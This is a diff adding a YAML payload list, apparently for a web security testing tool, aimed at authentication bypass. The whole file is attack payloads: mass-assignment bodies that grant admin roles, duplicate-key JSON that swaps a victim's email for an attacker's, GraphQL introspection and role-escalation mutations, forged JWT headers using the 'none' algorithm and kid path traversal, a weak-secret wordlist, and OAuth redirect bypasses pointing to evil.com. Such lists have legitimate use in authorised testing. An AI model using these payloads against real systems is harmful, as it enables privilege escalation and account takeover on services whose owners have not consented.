@@ -1,0 +1,39 @@
+# payloads/auth_bypass.yml
+# Mass assignment, JWT tampering, and GraphQL/OAuth exploitation
+
+mass_assignment:
+  - '{"role": "admin"}'
+  - '{"is_admin": true}'
+  - '{"isAdmin": true}'
+  - '{"permissions": ["superuser"]}'
+  - '{"account_type": "premium"}'
+  - '{"access_level": 10}'
+  - '{"user_group": "staff"}'
+  - '{"can_delete": true}'
+  - '{"admin": 1}'
+
+json_pollution:
+  - '{"id": 1, "id": 2}'
+  - '{"email": "victim@target.com", "email": "attacker@evil.com"}'
+
+graphql:
+  introspection: "{ __schema { types { name fields { name type { name kind } } } } }"
+  mutations:
+    - "mutation { updateUser(input: {isAdmin: true}) { id } }"
+    - "mutation { updateRole(userId: \"VICTIM\", role: ADMIN) { success } }"
+
+jwt_attacks:
+  - name: "none_algorithm"
+    header: '{"alg":"none","typ":"JWT"}'
+  - name: "kid_path_traversal"
+    header: '{"alg":"HS256","typ":"JWT","kid":"../../../../../../../../dev/null"}'
+  - name: "hs256_weak_secrets"
+    secrets: ["secret", "password", "123456", "ghost", "admin", "key", "jwt_secret"]
+
+oauth_redirects:
+  - "https://evil.com"
+  - "//evil.com"
+  - "/\\evil.com"
+  - "https://target.com@evil.com"
+  - "https://target.com.evil.com"
+  - "https://target.com%2Eevil.com"
